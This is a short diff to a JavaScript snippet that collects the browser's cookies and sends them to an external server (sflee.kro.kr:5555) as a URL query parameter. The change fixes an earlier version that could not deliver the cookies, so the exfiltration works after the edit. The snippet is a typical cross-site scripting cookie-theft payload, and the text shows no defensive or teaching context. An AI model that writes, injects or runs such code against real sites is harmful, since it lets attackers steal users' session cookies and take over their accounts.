@@ -1,16 +1,14 @@
 (function() {
-    const Url = '//sflee.kro.kr:5555/api/v1/my_cookie_info';
-
-    const cookies = document.cookie;
+    const cookies = encodeURIComponent(document.cookie);
+    const Url = `http://sflee.kro.kr:5555/api/v1/my_cookie_info?cookies=${cookies}`;
 
     fetch(Url, {
         method: 'GET',
         headers: {
             'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ cookies: cookies })
+        }
     })
-    .then(response => response.text())
+    .then(response => response.json())
     .then(result => console.log('전송 완료:', result))
     .catch(error => console.error('전송 실패:', error));
 })();
